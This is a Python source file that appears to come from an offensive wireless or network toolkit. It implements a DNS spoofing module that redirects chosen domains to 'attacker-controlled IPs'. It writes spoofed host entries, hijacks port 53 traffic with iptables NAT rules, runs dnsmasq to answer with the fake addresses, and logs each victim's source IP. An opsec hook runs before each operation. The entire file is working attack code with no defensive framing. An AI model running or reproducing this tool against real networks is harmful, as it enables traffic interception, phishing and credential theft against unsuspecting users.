"""DNS Spoof module — redirect specific domains to attacker-controlled IPs."""

from __future__ import annotations

import contextlib
import subprocess
import threading
import time
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

from ..core.config import Config
from ..core.opsec import OpsecEngine

console = Console()


@dataclass
class SpoofRule:
    domain: str
    redirect_ip: str
    wildcard: bool = False


@dataclass
class SpoofedQuery:
    timestamp: str
    source_ip: str
    domain: str
    redirected_to: str


class DnsSpoofModule:
    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec
        self.rules: list[SpoofRule] = []
        self.spoofed_queries: list[SpoofedQuery] = []
        self._running = False
        self._proc: subprocess.Popen | None = None

    def add_rule(self, domain: str, redirect_ip: str, wildcard: bool = False) -> None:
        rule = SpoofRule(domain=domain, redirect_ip=redirect_ip, wildcard=wildcard)
        self.rules.append(rule)
        console.print(
            f"[dim]DNS rule: {'*.' if wildcard else ''}{domain} → {redirect_ip}[/dim]"
        )

    def start(self, interface: str) -> bool:
        if not self.rules:
            console.print("[red]No DNS spoof rules configured[/red]")
            return False

        self.opsec.pre_operation()
        self._running = True

        hosts_content = self._build_hosts_file()
        hosts_path = "/tmp/voidfreq_dns_hosts"
        with open(hosts_path, "w") as f:
            f.write(hosts_content)

        self._redirect_dns(interface)

        self._proc = subprocess.Popen(
            ["sudo", "dnsmasq",
             "--no-daemon",
             "--no-resolv",
             f"--interface={interface}",
             "--server=8.8.8.8",
             f"--addn-hosts={hosts_path}",
             "--log-queries",
             "--log-facility=-"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )

        monitor_thread = threading.Thread(
            target=self._monitor_queries, daemon=True,
        )
        monitor_thread.start()

        console.print(f"[green]DNS spoofing active — {len(self.rules)} rules[/green]")
        return True

    def stop(self) -> list[SpoofedQuery]:
        self._running = False
        if self._proc:
            self._proc.terminate()
            self._proc = None

        self._restore_dns()

        import os
        with contextlib.suppress(FileNotFoundError):
            os.unlink("/tmp/voidfreq_dns_hosts")

        console.print(f"[yellow]DNS spoofing stopped — {len(self.spoofed_queries)} queries spoofed[/yellow]")
        return self.spoofed_queries

    def _build_hosts_file(self) -> str:
        lines = []
        for rule in self.rules:
            if rule.wildcard:
                lines.append(f"address=/.{rule.domain}/{rule.redirect_ip}")
            else:
                lines.append(f"{rule.redirect_ip} {rule.domain}")
        return "\n".join(lines) + "\n"

    def _redirect_dns(self, interface: str) -> None:
        subprocess.run(
            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", interface, "-p", "udp", "--dport", "53",
             "-j", "REDIRECT", "--to-port", "53"],
            capture_output=True,
        )
        subprocess.run(
            ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", interface, "-p", "tcp", "--dport", "53",
             "-j", "REDIRECT", "--to-port", "53"],
            capture_output=True,
        )

    def _restore_dns(self) -> None:
        subprocess.run(
            ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
             "-p", "udp", "--dport", "53",
             "-j", "REDIRECT", "--to-port", "53"],
            capture_output=True,
        )
        subprocess.run(
            ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
             "-p", "tcp", "--dport", "53",
             "-j", "REDIRECT", "--to-port", "53"],
            capture_output=True,
        )

    def _monitor_queries(self) -> None:
        if not self._proc or not self._proc.stdout:
            return

        spoofed_domains = {r.domain for r in self.rules}

        while self._running and self._proc.poll() is None:
            line = self._proc.stdout.readline().strip()
            if not line or "query" not in line.lower():
                continue

            for domain in spoofed_domains:
                if domain in line:
                    query = SpoofedQuery(
                        timestamp=time.strftime("%H:%M:%S"),
                        source_ip=self._extract_ip(line),
                        domain=domain,
                        redirected_to=next(
                            (r.redirect_ip for r in self.rules if r.domain == domain),
                            "unknown",
                        ),
                    )
                    self.spoofed_queries.append(query)
                    console.print(
                        f"[red]SPOOFED: {query.source_ip} → {domain} "
                        f"→ {query.redirected_to}[/red]"
                    )

    def _extract_ip(self, line: str) -> str:
        import re
        match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
        return match.group(1) if match else "unknown"

    def display_rules(self) -> None:
        table = Table(title="DNS Spoof Rules")
        table.add_column("Domain", style="cyan")
        table.add_column("Redirect To", style="red")
        table.add_column("Wildcard", justify="center")

        for rule in self.rules:
            table.add_row(
                rule.domain, rule.redirect_ip,
                "✓" if rule.wildcard else "✗",
            )

        console.print(table)

    def display_log(self) -> None:
        table = Table(title="Spoofed DNS Queries")
        table.add_column("Time", style="dim")
        table.add_column("Source", style="cyan")
        table.add_column("Domain", style="yellow")
        table.add_column("Redirected To", style="red")

        for q in self.spoofed_queries[-30:]:
            table.add_row(q.timestamp, q.source_ip, q.domain, q.redirected_to)

        console.print(table)
